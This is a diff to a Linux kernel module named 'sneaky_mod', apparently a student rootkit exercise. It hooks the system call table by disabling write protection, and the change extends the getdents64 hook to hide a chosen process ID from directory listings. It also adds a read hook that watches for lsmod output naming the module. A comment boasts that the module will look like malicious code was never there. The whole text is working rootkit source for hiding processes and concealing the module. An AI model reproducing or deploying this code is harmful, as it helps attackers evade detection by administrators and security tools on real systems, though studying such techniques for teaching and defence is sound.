@@ -2,7 +2,7 @@
 #include <asm/current.h>  // process information
 #include <asm/page.h>
 #include <asm/unistd.h>  // for system call constants
-//#include <linux/dirent.h>
+#include <linux/dirent.h>
 #include <linux/highmem.h>  // for changing page permissions
 #include <linux/init.h>     // for entry/exit macros
 #include <linux/kallsyms.h>
@@ -10,6 +10,7 @@
 #include <linux/module.h>  // for all modules
 #include <linux/moduleparam.h>
 #include <linux/sched.h>
+#include <linux/unistd.h>
 #define PREFIX "sneaky_process"
 
 // This is the parameter to be passed in
@@ -18,15 +19,6 @@ module_param(pid, long, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
 
 //This is a pointer to the system call table
 static unsigned long * sys_call_table;
-
-// struct for getdents64
-struct linux_dirent64 {
-  u64 d_ino;
-  s64 d_off;
-  unsigned short d_reclen;
-  unsigned char d_type;
-  char d_name[0];
-};
 
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
@@ -50,18 +42,20 @@ int disable_page_rw(void * ptr) {
 asmlinkage int (*original_getdents64)(struct pt_regs *);
 
 asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
-  int total_len = (*original_getdents64)(regs);
+  int total_len = original_getdents64(regs);
   struct linux_dirent64 * direct_arr = (struct linux_dirent64 *)(regs->si);
   int remain_len = total_len;
+  char pid_string[512];
+  sprintf(pid_string, "%ld", pid);
   while (remain_len > 0) {
-    if (strcmp(direct_arr->d_name, "sneaky_process") == 0) {
+    if (strcmp(direct_arr->d_name, "sneaky_process") == 0 ||
+        strcmp(direct_arr->d_name, pid_string) == 0) {
       struct linux_dirent64 * dest = (struct linux_dirent64 *)direct_arr;
       struct linux_dirent64 * src =
           (struct linux_dirent64 *)((char *)direct_arr + direct_arr->d_reclen);
       int src_len = remain_len - direct_arr->d_reclen;
       memmove(dest, src, src_len);
       remain_len = src_len;
-      printk(KERN_INFO "Find sneaky process!");
       continue;
     }
     remain_len -= direct_arr->d_reclen;
@@ -90,6 +84,15 @@ asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
   return (*original_openat)(regs);
 }
 
+asmlinkage int (*original_read)(struct pt_regs *);
+
+asmlinkage int sneaky_sys_read(struct pt_regs * regs) {
+  if (strstr(current->comm, "lsmod") && strstr((char *)(regs->si), "sneaky_mod")) {
+    printk(KERN_INFO "sneaky mod found");
+  }
+  return (*original_read)(regs);
+}
+
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void) {
   // See /var/log/syslog or use `dmesg` for kernel print output
@@ -105,13 +108,15 @@ static int initialize_sneaky_module(void) {
 
   original_openat = (void *)sys_call_table[__NR_openat];
   original_getdents64 = (void *)sys_call_table[__NR_getdents64];
+  original_read = (void *)sys_call_table[__NR_read];
 
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
 
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
-
+  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
+  //sys_call_table[__vfs__read] = (unsigned long)sneaky_sys_read;
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
 
@@ -128,7 +133,7 @@ static void exit_sneaky_module(void) {
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
-
+  sys_call_table[__NR_read] = (unsigned long)original_read;
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
 }
